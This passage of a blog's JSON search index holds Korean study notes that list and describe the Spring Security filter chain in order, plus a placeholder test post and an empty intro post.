UserDetailService","categories":[],"tags":[]},{"title":"spring_security_filter","slug":"spring-security-filter","date":"2019-11-21T07:07:05.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2019/11/21/spring-security-filter/","link":"","permalink":"https://blog.devkwang.app/2019/11/21/spring-security-filter/","excerpt":"","text":"순서 제목 내용 1 WebAsyncManagerIntegrationFilter 조사 요망 2 SecurityContextPersistence Filter Security Context Repository에서 SecurityContext를 로드하고 저장 3 HeaderWriterFilter 조사 요망 4 Logout Filter 로그아웃 URL로 지정된 가상 URL에 대한 요청 감시, 매칭되면 로그아웃 5 UsernamePasswordAuthenticationFilter 사용자명과 비밀번호로 이뤄진 폼 기반 인증 URL 확인 및 인증 진행 6 RequestCacheAwareFilter 로그인 성공 이후 인증 요청에 의해 가로 채어진 사용자의 원래 요청을 재구성 7 SecurityContextHolderAwareRequestFilter 조사 요망 8 AnonymousAuthenticationFilter 이 필터가 호출되는 시점까지 사용자가 아직 인증을 받지 못했다면 요청 관련 인증 토큰에서 사용자가 익명 사용자로 나타남 9 SessionManagementFilter 인증된 주체를 바탕으로 세션 트래킹을 처리해 단일 주체와 관련된 모든 세션 트래킹 10 ExceptionTranslationFilter 발생하는 예외 처리 담당 11 FilterSecurityFilter 권한부여 등 여러 결정을 AccessDecisionManager에게 위임해 최종 제어 하단은 타 블로그에서 참조 SecurityContextPersistenceFilter SecurityContextRepository 에서 SecurityContext 를 로딩하거나 SecurityContextRepository 로 SecurityContext 를 저장하는 역할을 한다.SecurityContext 란 사용자의 보호및 인증된 세션을 의미한다. LogoutFilter 로그아웃 URL(디폴트 값 : /j_spring_security_logout) 로의 요청을 감시하여 해당 사용자를 로그아웃 시킨다. UsernamePasswordAuthenticationFilter username 과 password 를 사용하는 폼기반 인증 요청 URL(디폴트 값: /j_spring_security_check) 을 감시하여 사용자를 인증하는 역할을 한다. DefaultLoginPageGeneratingFilter 폼또는 OpenID 기반 인증을 위한 로그인폼 URL(디폴트 값: /spring_security_login)을 감시하여 로그인폼을 생성한다. BasicAuthenticationFilter HTTP 기본 인증 헤더를 감시하여 처리한다. RequestCacheAwareFilter 로그인 성공 후, 원래 요청 정보를 재구성하기 위해 사용됨 SecurityContextHolderAwareRequestFilter HttpServletRequestWrapper 를 상속한 SecurityContextHolderAwareRequestWapper 클래스로 HttpServletRequest 정보를 감싼다. SecurityContextHolderAwareRequestWrapper 클래스는 필터 체인상의 다음 필터들에게 추가 정보를 제공한다. AnonymousAuthenticationFilter 이 필터가 호출되는 시점까지 사용자 정보가 인증되지 않았다면 사용자가 익명이라는 것 나타내는 인증토큰이 요청과 관련지어 진다. SessionManagementFilter 이 필터는 하나의 인증된 사용자와 관련된 모든 세션을 추적하고, 인증된 사용자 정보를 기반으로 세션을 추적을 처리한다. ExceptionTranslationFilter 이 필터는 보호된 요청을 처리하는 중에 발생하는 예상된 예외를 위임하거나 전달하는 역할을 한다. FilterSecurityInterceptor 이 필터는 AccessDecisionManager 로 인증에 대한 결정권을 위임함으로써 인증허가 및 접근제어 결정을 용이하게 한다.","categories":[],"tags":[]},{"title":"Setting","slug":"Setting","date":"2019-10-28T07:11:14.000Z","updated":"2022-01-28T01:25:12.423Z","comments":false,"path":"2019/10/28/Setting/","link":"","permalink":"https://blog.devkwang.app/2019/10/28/Setting/","excerpt":"","text":"https://github.com/LouisBarranqueiro https://github.com/LouisBarranqueiro/hexo-algoliasearch hello olleh 123public static void main(String[] args) &#123;&#125;","categories":[],"tags":[]},{"title":"intro","slug":"intro","date":"2019-10-28T06:40:04.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2019/10/28/intro/","link":"","permalink":"https://blog.devkwang.app/2019/10/28/intro/","excerpt":"","text":"","categories":[],"tags":[]}]}